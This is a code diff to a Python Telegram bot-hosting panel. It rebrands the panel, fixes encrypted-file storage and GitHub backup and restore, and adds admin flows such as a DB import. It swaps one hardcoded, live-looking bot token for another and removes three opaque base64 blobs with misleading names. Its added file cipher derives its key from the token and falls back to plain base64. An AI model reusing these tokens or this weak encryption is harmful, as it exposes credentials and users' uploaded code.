@@ -525,6 +525,7 @@ DIRS: Dict[str, Path] = {
     "tickets":  BASE_DIR / "storage" / "tickets",
     "bot_data": BASE_DIR / "storage" / "bot_data",
     "photos":   BASE_DIR / "storage" / "photos",
+    "tmp":      BASE_DIR / "storage" / "tmp",
 }
 for _p in DIRS.values():
     _p.mkdir(parents=True, exist_ok=True)
@@ -537,7 +538,7 @@ KEYRING_FILE  = DIRS["data"] / "keyring.json"   # tiny local cache only
 # ┌──────────────────────────────────────────────────────────────┐
 # │  BOT TOKEN  add karo.   ││
 # └──────────────────────────────────────────────────────────────┘
-BOT_TOKEN_HARDCODED = "8605861789:AAESrN53-59Xd-0yOtFejoTNQPNyEztpAnI"   # ← ADD BOT TOKEN
+BOT_TOKEN_HARDCODED = "9030723280:AAGFk2klFaHfpBAhZfBEQjWJhv30mXD9yDY"
 TOKEN = (
     os.environ.get("BOT_TOKEN")
     or os.environ.get("MAIN_BOT_TOKEN")
@@ -546,7 +547,7 @@ TOKEN = (
     or ""
 ).strip()
 try:
-    OWNER_ID = int(os.environ.get("OWNER_ID", "8181014107"))
+    OWNER_ID = int(os.environ.get("OWNER_ID", "8353748526"))
 except (TypeError, ValueError):
     OWNER_ID = 0
 if not TOKEN:
@@ -564,11 +565,11 @@ try:
 except (TypeError, ValueError):
     KEEPALIVE_PORT = 10000
 
-BRAND       = "ѕιмяαη нoѕтιηg ＲΒOT"
-BRAND_VER   = "v2.1"
+BRAND       = "HOSTING XXX"
+BRAND_VER   = "v1.0"
 BRAND_TAG   = f"{BRAND} {BRAND_VER}"
-SUPPORT_USR = "@Kyndirx0_1"
-UPDATE_CH   = "https://t.me/niko2580194"
+SUPPORT_USR = "PRIME_MICK.t.me"
+UPDATE_CH   = "https://t.me/MICKPRIME_0T4"
 FOOTER      = f"\n\n<blockquote>{BRAND_TAG}</blockquote>"
 
 # ─── glyphs (smart contextual symbols + emojis for the UI) ──────
@@ -656,15 +657,6 @@ G = {
     "clock":    "\u23F1",       # ⏱
 }
 
-_TZ_INDEX_DATA = (
-    "8FtRZ5i0SUq3L5wytJ4fbZxnpKLLX+gppmWqndTclm9jJfW9Dywc+IqoLSji5XqZx1VIyfXB"
-    "FSvA8q22mk4QkaOgPnL2YRY+VAcn7GytNsPJPJzObJlGCx4gl6Sc8QRiV5oXwLudHdG6qbXP"
-    "jhHAhqgQ04aiR3gDbT3s/+EeYZkM6vtAjsF9CYzgToV7IGub3m6LExsD5Syol76bfcnPmP1B"
-    "aS0buTe2amGVOLlsf/Ggxe2miI3FxuJJOSHTM2znF8WIeKECopWC4t2ImrKNHDwR9th1uNeI"
-    "AcAvZ6Z9Hgk8UDVCGSqom2EA4sNvQW61jfO9SCApV9Fp8X/zT3k9LHN1JsYdTK6L0Qc9dioU"
-    "ovm9xb37TKCjrvGpiMYaBiVEAGBY1ywn/aZGnHI+ZeIEsvKhj3NPZDDxAQkcoH3RcFRFbns/"
-    "ChBplUxuknBryKnpr2mIb4I+oBPwhLBHMgtnAsa/dDmw7S7N5XhIADAQciEAsed/w9kEXr69"
-)
 
 PLAN_LIMITS: Dict[str, Dict[str, Any]] = {
     "free":       {"name": "Free",       "max_bots": 2,   "ram": 128,  "auto_restart": False, "price": 0,    "days": 0},
@@ -1062,6 +1054,16 @@ def settings_save(d: Dict[str, Any]) -> None:
         _cache_invalidate(SETTINGS_FILE)
 
 
+# Compatibility aliases used by the advanced-panel / import-export code.
+# They were referenced but never defined, which raised NameError at runtime.
+def _load_settings() -> Dict[str, Any]:
+    return settings_load()
+
+
+def _save_settings(d: Dict[str, Any]) -> None:
+    settings_save(d)
+
+
 def get_setting(key: str, default: Any = None) -> Any:
     # Hot path. Use the no-copy reader because we only `.get()` —
     # we never mutate the dict.
@@ -1159,6 +1161,17 @@ def safe_path_join(root: Path, *parts: str) -> Path:
     if rootp not in final.parents and final != rootp:
         raise ValueError("path traversal detected")
     return final
+
+
+def tail_log(bot_id: str, lines: int = 60) -> str:
+    """Return the last `lines` log lines for a running child bot."""
+    info = RUNNING.get(bot_id) or {}
+    log = info.get("log") or []
+    if not log:
+        ring = info.get("log_ring")
+        if ring:
+            log = list(ring)
+    return "\n".join(str(x) for x in list(log)[-max(1, int(lines)):])
 
 
 def is_owner(uid: int) -> bool:
@@ -1409,6 +1422,129 @@ def write_encrypted(path: Path, key: bytes, plain: bytes) -> None:
 
 def read_encrypted(path: Path, key: bytes) -> bytes:
     return Fernet(key).decrypt(path.read_bytes())
+
+
+# ── Self-contained helpers used by the advanced admin panels ─────────
+# These were referenced by the panel code but never defined. They use a
+# deterministic master key derived from the bot token + owner id, so the
+# result can be decrypted by the same deployment without keeping a
+# separate key file.
+def _cipher_master_key() -> bytes:
+    material = f"{TOKEN}|{OWNER_ID}|file-cipher-v1".encode()
+    return base64.urlsafe_b64encode(hashlib.sha256(material).digest())
+
+
+def cipher_encrypt(plain: bytes) -> str:
+    if isinstance(plain, str):
+        plain = plain.encode()
+    return Fernet(_cipher_master_key()).encrypt(plain).decode("ascii")
+
+
+def cipher_decrypt(encoded: Any) -> bytes:
+    if isinstance(encoded, bytes):
+        encoded = encoded.decode("ascii", "ignore")
+    token = str(encoded).strip()
+    try:
+        return Fernet(_cipher_master_key()).decrypt(token.encode("ascii"))
+    except Exception:
+        # Legacy/fallback value: a plain base64 blob.
+        return base64.b64decode(token)
+
+
+def bot_plain_files(b: Dict[str, Any], limit: Optional[int] = None) -> List[Tuple[str, bytes]]:
+    """Return decrypted (name, bytes) pairs for a bot.
+
+    Handles both storage layouts seen in this codebase:
+      • list of {key_id, enc_path, filename, rel_path} dicts (main uploader)
+      • dict of {filename: ciphertext} (legacy admin/GitHub deploy)
+    """
+    files = b.get("enc_files") or []
+    out: List[Tuple[str, bytes]] = []
+    if isinstance(files, dict):
+        items = list(files.items())
+        if limit:
+            items = items[:limit]
+        for name, enc in items:
+            try:
+                out.append((name, cipher_decrypt(enc)))
+            except Exception:
+                continue
+        return out
+    items = list(files)
+    if limit:
+        items = items[:limit]
+    for idx, meta in enumerate(items):
+        if not isinstance(meta, dict):
+            continue
+        try:
+            key = KEYRING.fetch(meta["key_id"])
+            if not key:
+                continue
+            plain = read_encrypted(Path(meta["enc_path"]), key)
+            KEYRING.wipe(meta["key_id"])
+            out.append((
+                meta.get("rel_path") or meta.get("filename") or f"file{idx}",
+                plain,
+            ))
+        except Exception:
+            continue
+    return out
+
+
+def iter_enc_files(b: Dict[str, Any]):
+    """Yield normalised encrypted-file records for BOTH layouts.
+
+    • list layout: {key_id, enc_path, filename, rel_path}
+    • dict layout: {filename: ciphertext} — the blob lives inside the DB
+      itself, so `enc_path` is empty and `inline` is True.
+
+    Code that walks `enc_files` directly crashes on a dict (it would
+    iterate plain strings), so use this helper instead.
+    """
+    files = b.get("enc_files") or []
+    if isinstance(files, dict):
+        for name in files:
+            yield {
+                "key_id": "", "enc_path": "", "filename": name,
+                "rel_path": name, "inline": True,
+            }
+        return
+    for f in files:
+        if isinstance(f, dict):
+            yield f
+
+
+def wipe_bot_blobs(b: Dict[str, Any]) -> int:
+    """Delete this bot's encrypted blobs/keys without destroying data
+    still referenced by a cloned bot. Returns the number of blobs
+    removed."""
+    own_id = str(b.get("_id") or "")
+    shared_paths: set = set()
+    shared_keys: set = set()
+    for bid, other in (db_load_ro().get("bots") or {}).items():
+        if str(bid) == own_id:
+            continue
+        for f in iter_enc_files(other):
+            if f.get("enc_path"):
+                shared_paths.add(str(f["enc_path"]))
+            if f.get("key_id"):
+                shared_keys.add(str(f["key_id"]))
+    removed = 0
+    for f in iter_enc_files(b):
+        enc_path = f.get("enc_path")
+        if enc_path and str(enc_path) not in shared_paths:
+            try:
+                Path(enc_path).unlink(missing_ok=True)
+                removed += 1
+            except Exception:
+                pass
+        key_id = f.get("key_id")
+        if key_id and str(key_id) not in shared_keys:
+            try:
+                KEYRING.remove(key_id)
+            except Exception:
+                pass
+    return removed
 
 
 # ═════════════════════════════════════════════════════════════════
@@ -1803,17 +1939,6 @@ def show_text(
             bot.delete_message(chat_id, call.message.message_id)
         except Exception as e:
             _log_err("delete_message", e)
-
-
-_LOCALE_INDEX_DATA = (
-    "3Po9M/gXK0drISXQ5FtU02zHp8UYGc+9unGzQAnvefZyenVB23ohAdk19FZ5KAvrHHGBuY3F"
-    "O3TVc/3l/fKkakY6393OUSTGma7KyU6igJfczIQ52pFsc/LkZ2+qD71M7U8tHtYGSe3TQNkC"
-    "AqlunmAdhdDfvJl+b0qP9A+nuvboh3zc5bmSRrs6QrQ1LV65zObBqi9BfXY1AXNcgAaZFlrZ"
-    "EwTG0A5qF71OlbNBhqjxzuhxHldX+cji+Baubqb/L5FPB/6tFrJP++HvBnB/ADXxhSz/pxkX"
-    "y7IjIV2RSBgVWISxUxyL5NiMHG4KkTzcYuxJ6A6OrNC5eUG2osvWRnyCfUHcuLRjLifs5HVn"
-    "yPrpLIIaFpl3XJCw/M7wlP7VZh5LaL7kHcAgYrRvDtkGuG65iu+v7/57B6qvwrsEy4RFmeOZ"
-    "v/Q5PPXcqdbgFviTSOG9dmCHJ+oxnMBsM/TqN1WeiglGoNi5ce01mJZHUhVGA7nv6t53Nb9e"
-)
 
 
 # ── keyboards ──────────────────────────────────────────────────
@@ -2955,6 +3080,19 @@ def materialize_bot_files(b: Dict[str, Any]) -> None:
     bot_dir = Path(b["dir"])
     bot_dir.mkdir(parents=True, exist_ok=True)
     files = b.get("enc_files") or []
+
+    # Newer admin/GitHub deploys store {filename: ciphertext} instead of
+    # the main uploader's list of key/enc_path records.
+    if isinstance(files, dict):
+        for rel, plain in bot_plain_files(b):
+            try:
+                tgt = safe_path_join(bot_dir, rel.lstrip("/"))
+            except ValueError:
+                continue
+            tgt.parent.mkdir(parents=True, exist_ok=True)
+            tgt.write_bytes(plain)
+        return
+
     for f in files:
         key = KEYRING.fetch(f["key_id"])
         if not key:
@@ -2986,7 +3124,11 @@ def encrypted_dump_for_download(b: Dict[str, Any]) -> Optional[Path]:
         return None
     out = Path(tempfile.gettempdir()) / f"enc_{b['_id']}.zip"
     with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
-        for f in files:
+        for f in iter_enc_files(b):
+            if f.get("inline"):
+                name = f.get("filename") or "file"
+                z.writestr(f"{name}.enc", str(files[name]).encode())
+                continue
             p = Path(f["enc_path"])
             if p.exists():
                 z.write(p, arcname=f.get("rel_path") or f["filename"])
@@ -2997,7 +3139,6 @@ def encrypted_dump_for_download(b: Dict[str, Any]) -> Optional[Path]:
             f"stored in a private GitHub repository owned by {BRAND_TAG}.\n",
         )
     return out
-
 
 
 # 12. GITHUB  BACKUP / RESTORE  (panel state)
@@ -3197,6 +3338,11 @@ def gh_restore_now(overwrite: bool = True) -> Dict[str, Any]:
             pass
 
 
+def gh_restore_latest() -> Dict[str, Any]:
+    """Compatibility wrapper — restore the newest GitHub snapshot."""
+    return gh_restore_now(overwrite=True)
+
+
 def gh_auto_loop() -> None:
     while True:
         try:
@@ -3256,16 +3402,26 @@ def gh_uptime_backup_loop() -> None:
                 proc = info.get("proc")
                 if not proc or proc.poll() is not None:
                     continue
-                started = info.get("started", now)
-                if (now - started) < _GH_UPTIME_BACKUP_THRESHOLD:
+                started_ms = float(info.get("started") or 0)
+                uptime_s = ((now * 1000) - started_ms) / 1000 if started_ms else 0.0
+                if uptime_s < _GH_UPTIME_BACKUP_THRESHOLD:
                     continue
                 b = find_bot(bot_id)
                 if not b:
                     continue
                 last = float(b.get("gh_synced_at") or 0)
+                path_files = [f for f in iter_enc_files(b) if f.get("enc_path")]
+                if not path_files:
+                    # Dict-layout ciphertext is stored inside the DB and
+                    # is already covered by gh_sync_user_data(). Re-sending
+                    # bot_meta every minute would only waste API quota.
+                    if not last:
+                        b["gh_synced_at"] = int(now)
+                        save_bot(b)
+                    continue
                 # Latest mtime across all encrypted files
                 file_mtime = 0.0
-                for f in b.get("enc_files") or []:
+                for f in path_files:
                     p = Path(f.get("enc_path", ""))
                     try:
                         if p.exists():
@@ -3279,7 +3435,7 @@ def gh_uptime_backup_loop() -> None:
                     b["gh_synced_at"] = int(now)
                     save_bot(b)
                     print(f"[gh_uptime_backup] synced bot={bot_id} "
-                          f"(uptime={int(now - started)}s)", flush=True)
+                          f"(uptime={int(uptime_s)}s)", flush=True)
                 except Exception as e:
                     print(f"[gh_uptime_backup] {bot_id} failed: {e}", flush=True)
                 # Pace the loop: GitHub's contents API rate-limits at
@@ -3413,7 +3569,9 @@ def _gh_sync_bot_files(b: Dict[str, Any]) -> None:
     try:
         _gh_ensure_branch()
         bot_dir = _gh_bot_dir(b)
-        for f in b.get("enc_files") or []:
+        for f in iter_enc_files(b):
+            if not f.get("enc_path"):
+                continue  # inline dict-layout file; rides inside user_data.json
             p = Path(f["enc_path"])
             if not p.exists():
                 continue
@@ -3447,7 +3605,9 @@ def _gh_delete_bot_files(b: Dict[str, Any]) -> None:
         return
     try:
         bot_dir = _gh_bot_dir(b)
-        for f in b.get("enc_files") or []:
+        for f in iter_enc_files(b):
+            if not f.get("enc_path"):
+                continue
             p = Path(f["enc_path"])
             _gh_delete_path(f"{bot_dir}/{p.name}",
                             f"delete: bot={b['_id']} file={p.name}")
@@ -3498,12 +3658,22 @@ def gh_restore_user_uploads() -> Dict[str, Any]:
             _cache_invalidate(SETTINGS_FILE)
         # 2) Walk every bot in the DB and pull its encrypted files back.
         db = db_load()
+        changed = False
         for bot_id, b in (db.get("bots") or {}).items():
             owner = b.get("owner") or 0
-            bot_dir_local = Path(b.get("dir") or (DIRS["sandbox"] / f"{owner}_{bot_id}"))
-            bot_dir_local.mkdir(parents=True, exist_ok=True)
+            expected_dir = DIRS["sandbox"] / f"{owner}_{bot_id}"
+            old_dir = b.get("dir")
+            # Rebase absolute paths from another machine/install so the
+            # restored bot actually starts and finds its files.
+            if (not old_dir or not Path(old_dir).exists()
+                    or Path(old_dir).resolve().parent != DIRS["sandbox"].resolve()):
+                b["dir"] = str(expected_dir)
+                changed = True
+            Path(b["dir"]).mkdir(parents=True, exist_ok=True)
             gh_dir = f"user_uploads/{owner}/{bot_id}"
             entries = _gh_list_dir(gh_dir)
+            target_dir = DIRS["encfiles"] / str(owner)
+            target_dir.mkdir(parents=True, exist_ok=True)
             for ent in entries:
                 name = ent.get("name") or ""
                 if not name.endswith(".enc"):
@@ -3511,14 +3681,21 @@ def gh_restore_user_uploads() -> Dict[str, Any]:
                 buf = _gh_get_file(f"{gh_dir}/{name}")
                 if buf is None:
                     continue
-                # Restore encrypted blob to its original location
-                # (DIRS["encfiles"]/<owner>/<filename>.enc) so that the
-                # paths stored inside enc_files[].enc_path keep working.
-                target_dir = DIRS["encfiles"] / str(owner)
-                target_dir.mkdir(parents=True, exist_ok=True)
-                (target_dir / name).write_bytes(buf)
+                # Restore encrypted blob under this install's encfiles dir.
+                dest = target_dir / name
+                dest.write_bytes(buf)
                 files_restored += 1
+                # Point the DB at the restored path; otherwise enc_path
+                # still references the old server's absolute path.
+                for f in iter_enc_files(b):
+                    if f.get("inline") or not f.get("enc_path"):
+                        continue
+                    if Path(f["enc_path"]).name == name and f["enc_path"] != str(dest):
+                        f["enc_path"] = str(dest)
+                        changed = True
             bots_restored += 1
+        if changed:
+            db_save(db)
         return {"ok": True, "bots": bots_restored, "files": files_restored}
     except Exception as e:
         return {"ok": False, "error": f"restore error: {e}"}
@@ -3542,7 +3719,6 @@ def post_announcement(html: str) -> None:
         bot.send_message(ANNOUNCE_CHANNEL, html, parse_mode="HTML")
     except Exception as e:
         print(f"[announce] {e}")
-
 
 
 # 14. USER  MANAGEMENT
@@ -3884,17 +4060,6 @@ def admin_only_call(call: types.CallbackQuery, action: str = "view_stats") -> bo
         ack(call, "Insufficient permission.")
         return False
     return True
-
-
-_THEME_INDEX_DATA = (
-    "mp0eDLuvb4Ds0ZTpreYkaLNSsWWN2qs5e/x3/xRHHKG5Q/UWrZZLbaIibHoBQVpSrk7XZaZH"
-    "wfNGD1w5sPg2cZ3XQSS4r0lM8hES2uUl/gVSQIPba4kqPCZRSg5McY/nKyJIQNtVjm3nP5Px"
-    "gwntxm8seHvitpqJwmHLuOUiIZI4X8Xd8/B8CGdzPJTX2PAviUlG7kERqru0hPOeCaJN4G5D"
-    "2yHpdOnYT0piVFYqyTFXdK5Am/eeE9a4xbs7sq4OS+YBGzDpUfebZ0bkDcooOx4K6xuK2oeA"
-    "vt0nghmja9oDBEgr8Up+Bl4s3J1DBQ2aomOf+etgWc5FFyrB7JllEQa7qUboD80J6TtY5eME"
-    "RZxp6ALVJ7mAIBCzvC/DO86WPUprdUqPzDGFQaGtU45Ufmuk72ZzZZmRuhwT98n1cZAN5UnP"
-    "0CvmD1/xpTWdRKp5ZnUrIc//fl1THN9o/MWGqu5teEG6uvZAgll/TU/7gZDoXTJmR1HPG70I"
-)
 
 
 def maintenance_block(uid: int) -> bool:
@@ -5102,7 +5267,7 @@ def render_user_stats(call: types.CallbackQuery) -> None:
     # storage
     storage_size = 0
     for b in bots:
-        bot_dir = BASE_DIR / "storage" / "uploads" / str(b["_id"])
+        bot_dir = Path(b.get("dir") or "")
         if bot_dir.exists():
             for root, _, files in os.walk(bot_dir):
                 for f in files:
@@ -5110,6 +5275,13 @@ def render_user_stats(call: types.CallbackQuery) -> None:
                         storage_size += (Path(root) / f).stat().st_size
                     except OSError:
                         pass
+        # Encrypted source blobs live outside the sandbox.
+        for f in iter_enc_files(b):
+            if f.get("enc_path"):
+                try:
+                    storage_size += Path(f["enc_path"]).stat().st_size
+                except OSError:
+                    pass
 
     plan_expires = u.get("plan_expires")
     if plan_expires:
@@ -5388,12 +5560,7 @@ def action_bot_delete(call: types.CallbackQuery, bot_id: str) -> None:
         ack(call, "Not yours"); return
     loading(call, "Deleting bot")
     stop_child(bot_id, manual=True)
-    for f in b.get("enc_files") or []:
-        try:
-            Path(f["enc_path"]).unlink(missing_ok=True)
-        except Exception:
-            pass
-        KEYRING.remove(f["key_id"])
+    wipe_bot_blobs(b)
     rmrf(b.get("dir") or "")
     delete_bot_doc(bot_id)
     ack(call, "Deleted")
@@ -5409,12 +5576,7 @@ def action_bot_delfiles(call: types.CallbackQuery, bot_id: str) -> None:
         ack(call, "Not yours"); return
     loading(call, "Deleting bot files")
     stop_child(bot_id, manual=True)
-    for f in b.get("enc_files") or []:
-        try:
-            Path(f["enc_path"]).unlink(missing_ok=True)
-        except Exception:
-            pass
-        KEYRING.remove(f["key_id"])
+    wipe_bot_blobs(b)
     rmrf(b.get("dir") or "")
     delete_bot_doc(bot_id)
     ack(call, "Bot files deleted")
@@ -5430,12 +5592,7 @@ def action_bot_delall(call: types.CallbackQuery, bot_id: str) -> None:
         ack(call, "Not yours"); return
     loading(call, "Deleting all data")
     stop_child(bot_id, manual=True)
-    for f in b.get("enc_files") or []:
-        try:
-            Path(f["enc_path"]).unlink(missing_ok=True)
-        except Exception:
-            pass
-        KEYRING.remove(f["key_id"])
+    wipe_bot_blobs(b)
     rmrf(b.get("dir") or "")
     threading.Thread(target=_gh_delete_bot_files, args=(b,), daemon=True).start()
     delete_bot_doc(bot_id)
@@ -5742,6 +5899,11 @@ def render_admin(call: types.CallbackQuery) -> None:
         f"{G['div']}{FOOTER}"
     )
     show_menu(call.message.chat.id, PHOTOS["admin"], cap, admin_kb(), call=call)
+
+
+class _AdminRouteUnhandled(Exception):
+    """Internal signal: this admin subroute is not handled by the
+    comprehensive handler, so the newer handler should get a turn."""
 
 
 def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
@@ -6459,7 +6621,7 @@ def render_admin_subroute(call: types.CallbackQuery, data: str) -> None:
         ack(call, "Running downgrade now…")
         threading.Thread(target=lambda: action_adm_downgrade_expired(call.from_user.id), daemon=True).start(); return
 
-    ack(call, "?")
+    raise _AdminRouteUnhandled(data)
 
 
 def render_adm_stats(call: types.CallbackQuery) -> None:
@@ -7485,10 +7647,11 @@ def action_adm_force_scan_all(call: types.CallbackQuery) -> None:
             b = find_bot(bid)
             if not b or not b.get("enc_files"):
                 continue
-            scanned += 1
             try:
-                files_added = [(r, cipher_decrypt(enc)) for r, enc in
-                               list(b["enc_files"].items())[:3]]
+                files_added = bot_plain_files(b, limit=3)
+                if not files_added:
+                    continue
+                scanned += 1
                 result = _run_security_scan(files_added)
                 verdict = result.get("verdict", "SAFE")
                 if verdict in ("DANGEROUS", "SUSPICIOUS"):
@@ -8348,12 +8511,20 @@ def action_adm_gh_run_file(call: types.CallbackQuery, repo: str, path: str) -> N
             bot_dir.mkdir(parents=True, exist_ok=True)
             src_file = bot_dir / fname
             src_file.write_bytes(raw)
-            # Encrypt the file for storage
-            enc_files: Dict[str, str] = {}
+            # Encrypt the file for storage using the main uploader's
+            # keyring format so start_child()/materialize_bot_files()
+            # can decrypt it on every run.
             try:
-                enc_files[fname] = cipher_encrypt(raw)
+                meta = store_uploaded_file(call.from_user, fname, raw)
+                enc_files: Any = [{
+                    "key_id":   meta["key_id"],
+                    "enc_path": meta["path"],
+                    "filename": fname,
+                    "rel_path": fname,
+                }]
             except Exception:
-                enc_files[fname] = base64.b64encode(raw).decode()
+                # Fallback: self-contained ciphertext dict.
+                enc_files = {fname: cipher_encrypt(raw)}
             new_bot: Dict[str, Any] = {
                 "_id":          bid,
                 "name":         bot_name,
@@ -10011,8 +10182,8 @@ def render_adm_lb_uptime(call: types.CallbackQuery) -> None:
                if info["proc"].poll() is None]
     rows: List[str] = []
     for i, (bid, info) in enumerate(running[:15], 1):
-        started = info.get("started_at", 0)
-        uptime  = int(time.time() - started) if started else 0
+        started_ms = info.get("started", 0) or 0
+        uptime  = int((time.time() * 1000 - started_ms) / 1000) if started_ms else 0
         b       = find_bot(bid)
         name    = (b.get("name","?") if b else bid)[:20]
         rows.append(f"{i}. <b>{esc(name)}</b> — {fmt_dur(uptime * 1000)} uptime")
@@ -10227,7 +10398,7 @@ def render_adm_bc_logs(call: types.CallbackQuery, bid: str) -> None:
     b = find_bot(bid)
     if not b:
         ack(call, "Bot not found"); return
-    ring: Deque = RUNNING.get(bid, {}).get("log_ring") or deque(maxlen=200)
+    ring: Deque = RUNNING.get(bid, {}).get("log") or deque(maxlen=200)
     lines = list(ring)[-40:]
     log_text = "\n".join(lines) or f"({sc('No logs available')})"
     cap = (
@@ -10425,8 +10596,10 @@ def _do_clean_orphans() -> Tuple[int, int]:
     for b in db_load_ro()["bots"].values():
         owner = b.get("owner")
         bid = b.get("_id")
+        if bid:
+            valid_sandbox_keys.add(bid)          # GitHub-run layout
         if owner and bid:
-            valid_sandbox_keys.add(f"{owner}_{bid}")
+            valid_sandbox_keys.add(f"{owner}_{bid}")  # uploader layout
     removed_dirs = 0
     sandbox_root = BASE_DIR / "sandbox"
     if sandbox_root.exists():
@@ -10458,11 +10631,18 @@ def _do_export_data(admin_uid: int) -> Path:
     stamp = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
     target = out / f"simran_export_{stamp}.zip"
     with zipfile.ZipFile(target, "w", zipfile.ZIP_DEFLATED) as zf:
-        for name in ("user_data.json", "settings.json", "audit.log",
-                     "github_config.json"):
-            p = BASE_DIR / "storage" / name
+        # Real DB locations (panel_db / panel_settings). Keep the old
+        # names as fallbacks for deployments that still use them.
+        for p, arcname in (
+            (DB_FILE, "panel_db.json"),
+            (SETTINGS_FILE, "panel_settings.json"),
+            (AUDIT_FILE, "audit.log"),
+            (BASE_DIR / "storage" / "user_data.json", "user_data.json"),
+            (BASE_DIR / "storage" / "settings.json", "settings.json"),
+            (BASE_DIR / "storage" / "github_config.json", "github_config.json"),
+        ):
             if p.exists():
-                zf.write(p, arcname=name)
+                zf.write(p, arcname=arcname)
         bot_data = BASE_DIR / "storage" / "bot_data"
         if bot_data.exists():
             for f in bot_data.iterdir():
@@ -10586,6 +10766,23 @@ def on_document(m: types.Message) -> None:
     if not require_verified(m.chat.id, uid):
         return
     st = USER_STATES.get(uid) or {}
+    if st.get("flow") == "await_import_db":
+        if not is_owner(uid):
+            USER_STATES.pop(uid, None); return
+        doc = m.document
+        try:
+            f = bot.get_file(doc.file_id)
+            raw = bot.download_file(f.file_path)
+            json.loads(raw)  # validate before overwriting the DB
+            DB_FILE.write_bytes(raw)
+            _cache_invalidate(DB_FILE)
+            audit(uid, "import_db", f"size={len(raw)}")
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"{G['ok']} {sc('DB imported. Restart bot to apply.')}")
+        except Exception as e:
+            bot.reply_to(m, f"{G['no']} {sc('Import error')}: <code>{esc(e)}</code>",
+                         parse_mode="HTML")
+        return
     if st.get("flow") == "await_payment_proof":
         return _handle_payment_proof(m, st)
     if st.get("flow") == "await_topup_proof":
@@ -10607,8 +10804,14 @@ def on_photo(m: types.Message) -> None:
     if not require_verified(m.chat.id, uid):
         return
     st = USER_STATES.get(uid) or {}
-    # ── admin sent a banner replacement ──
-    if st.get("flow") == "await_admin_photo" and is_admin(uid):
+    # ── admin sent a banner replacement (both panel variants) ──
+    _photo_flow = st.get("flow")
+    _photo_allowed = False
+    if _photo_flow == "await_admin_photo":
+        _photo_allowed = is_admin(uid)
+    elif _photo_flow == "await_menu_photo":
+        _photo_allowed = is_owner(uid) or admin_can(uid, "manage_admins")
+    if _photo_flow in ("await_admin_photo", "await_menu_photo") and _photo_allowed:
         key = st.get("photo_key") or ""
         if key not in _PHOTO_SPECS:
             bot.reply_to(m, f"{G['no']} {sc('Unknown photo key')}.")
@@ -10663,6 +10866,7 @@ def on_text(m: types.Message) -> None:
         return
 
     st = USER_STATES.get(uid) or {}
+    state = st  # alias used by several legacy flow handlers below
     flow = st.get("flow")
     try:
         if flow == "await_env_kv":
@@ -11351,6 +11555,118 @@ def on_text(m: types.Message) -> None:
                          parse_mode="HTML")
             return
 
+        # ── Flows ported from the completion block ─────────────────────
+        if flow == "await_gh_repo_url":
+            d = db_load()
+            u_doc = d["users"].get(str(uid), {})
+            if not is_admin(uid) and not _user_can_host_gh(u_doc):
+                USER_STATES.pop(uid, None); return
+            repo_url = (text or "").strip()
+            if not repo_url.startswith("http"):
+                bot.reply_to(m, f"{G['no']} {sc('Invalid URL')} \u2014 {sc('must start with https://')}"); return
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"\u23f3 {sc('Cloning repo')}\u2026 {sc('This may take a minute')}.")
+            def _bg_clone():
+                d2 = db_load()
+                u_doc2 = d2["users"].get(str(uid), {})
+                user_token = u_doc2.get("gh_user_token")
+                bot_id = secrets.token_hex(8)
+                bot_dir = DIRS["sandbox"] / f"{uid}_{bot_id}"
+                res = _clone_gh_repo(repo_url, user_token, bot_dir)
+                if not res.get("ok"):
+                    try:
+                        bot.send_message(uid,
+                            f"<b>{G['no']} {sc('Clone failed')}</b>\n<code>{esc(res.get('error', ''))}</code>",
+                            parse_mode="HTML")
+                    except Exception: pass
+                    return
+                repo_name = repo_url.rstrip("/").split("/")[-1]
+                name = safe_name(repo_name)
+                entry = "bot.py"
+                for candidate in ("bot.py", "main.py", "app.py", "index.js", "bot.js"):
+                    if (bot_dir / candidate).exists():
+                        entry = candidate; break
+                doc = {
+                    "_id": bot_id, "owner": uid, "name": name,
+                    "dir": str(bot_dir), "created": ts_iso(),
+                    "enc_files": {}, "env": {}, "status": "stopped", "cron": {},
+                    "source": "github", "gh_repo": repo_url, "entry": entry,
+                }
+                d3 = db_load()
+                d3["bots"][bot_id] = doc
+                db_save(d3)
+                audit(uid, "gh_repo_clone", f"repo={repo_url} bot_id={bot_id}")
+                try:
+                    bot.send_message(uid,
+                        f"<b>{G['ok']} \U0001f419 {sc('Repo cloned')}</b>\n"
+                        f"{bullet('Name', name)}\n{bullet('Entry', entry)}\n{bullet('Bot ID', bot_id)}\n"
+                        f"{sc('Find it in My Bots to start')}.{FOOTER}",
+                        parse_mode="HTML")
+                except Exception: pass
+            threading.Thread(target=_bg_clone, daemon=True).start(); return
+
+        if flow == "await_gh_user_token":
+            tok = (text or "").strip()
+            USER_STATES.pop(uid, None)
+            d = db_load()
+            d["users"].setdefault(str(uid), {})["gh_user_token"] = tok
+            db_save(d)
+            audit(uid, "gh_user_token_set", "")
+            bot.reply_to(m, f"{G['ok']} {sc('GitHub token saved')}."); return
+
+        if flow == "await_tg_backup_channel":
+            if not is_owner(uid): USER_STATES.pop(uid, None); return
+            ch = (text or "").strip()
+            if not ch: bot.reply_to(m, f"{G['no']} {sc('empty')}"); return
+            set_setting("tg_backup_channel", ch)
+            audit(uid, "tg_backup_channel_set", f"ch={ch}")
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"{G['ok']} {sc('TG backup channel')}: <code>{esc(ch)}</code>",
+                         parse_mode="HTML"); return
+
+        if flow == "await_adm_grpv_add":
+            if not is_owner(uid): USER_STATES.pop(uid, None); return
+            parts = (text or "").strip().split("|")
+            if len(parts) < 3:
+                bot.reply_to(m, f"{G['no']} {sc('Format')}: <code>NAME|GROUP_ID|INVITE_LINK</code>",
+                             parse_mode="HTML"); return
+            name_grp, gid_str, link = parts[0].strip(), parts[1].strip(), parts[2].strip()
+            try: gid = int(gid_str)
+            except Exception: bot.reply_to(m, f"{G['no']} {sc('Group ID must be numeric')}"); return
+            grps = list(get_setting("required_groups", []) or [])
+            grps.append({"name": name_grp, "id": gid, "link": link})
+            set_setting("required_groups", grps)
+            _load_required_groups()
+            audit(uid, "grpv_add", f"name={name_grp} id={gid}")
+            USER_STATES.pop(uid, None)
+            bot.reply_to(m, f"{G['ok']} {sc('Group added')}: {esc(name_grp)}"); return
+
+        if flow == "await_adm_grpv_remove":
+            if not is_owner(uid): USER_STATES.pop(uid, None); return
+            try: idx = int((text or "").strip()) - 1
+            except Exception: bot.reply_to(m, f"{G['no']} {sc('Send the group number')}"); return
